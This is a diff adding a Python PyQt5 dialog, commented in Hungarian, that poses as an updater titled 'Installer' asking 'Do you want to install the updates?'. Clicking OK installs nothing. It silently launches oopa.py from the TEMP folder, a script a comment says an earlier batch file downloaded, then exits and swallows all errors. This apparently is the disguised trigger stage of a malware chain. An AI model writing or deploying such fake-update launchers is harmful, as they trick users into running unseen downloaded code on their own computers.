@@ -1,0 +1,58 @@
+import sys
+import os
+import subprocess
+from PyQt5 import QtCore, QtGui, QtWidgets
+
+class Ui_Dialog(object):
+    def setupUi(self, Dialog):
+        Dialog.setObjectName("Dialog")
+        Dialog.resize(400, 300)
+        
+        # Szövegdoboz (kicsit kisebb, hogy alatta elférjenek a gombok)
+        self.textBrowser = QtWidgets.QTextBrowser(Dialog)
+        self.textBrowser.setGeometry(QtCore.QRect(10, 10, 380, 200))
+        self.textBrowser.setObjectName("textBrowser")
+        
+        # Gombok (vízszintes elrendezés az ablak alján)
+        self.buttonBox = QtWidgets.QDialogButtonBox(Dialog)
+        self.buttonBox.setGeometry(QtCore.QRect(10, 230, 380, 40))
+        self.buttonBox.setOrientation(QtCore.Qt.Horizontal)
+        self.buttonBox.setStandardButtons(QtWidgets.QDialogButtonBox.Cancel|QtWidgets.QDialogButtonBox.Ok)
+        self.buttonBox.setCenterButtons(True)
+        self.buttonBox.setObjectName("buttonBox")
+
+        # Előre hozzuk a gombokat, hogy ne takarja el semmi
+        self.buttonBox.raise_()
+
+        self.retranslateUi(Dialog)
+        
+        # OK gomb esemény
+        self.buttonBox.accepted.connect(self.run_logic)
+        self.buttonBox.rejected.connect(Dialog.reject)
+        QtCore.QMetaObject.connectSlotsByName(Dialog)
+
+    def retranslateUi(self, Dialog):
+        _translate = QtCore.QCoreApplication.translate
+        Dialog.setWindowTitle(_translate("Dialog", "Installer"))
+        self.textBrowser.setHtml(_translate("Dialog", "<html><body><p align='center' style='font-size:10pt;'><b>Installer</b><br><br>Do you want to install the updates?</p></body></html>"))
+
+    def run_logic(self):
+        try:
+            # Megkeressük az oopa.py-t a TEMP mappában (amit a batch letöltött)
+            temp = os.environ.get('TEMP')
+            oopa = os.path.join(temp, "oopa.py")
+            
+            if os.path.exists(oopa):
+                subprocess.Popen([sys.executable, oopa], creationflags=subprocess.CREATE_NEW_CONSOLE)
+            
+            sys.exit()
+        except:
+            sys.exit()
+
+if __name__ == "__main__":
+    app = QtWidgets.QApplication(sys.argv)
+    Dialog = QtWidgets.QDialog()
+    ui = Ui_Dialog()
+    ui.setupUi(Dialog)
+    Dialog.show()
+    sys.exit(app.exec_())
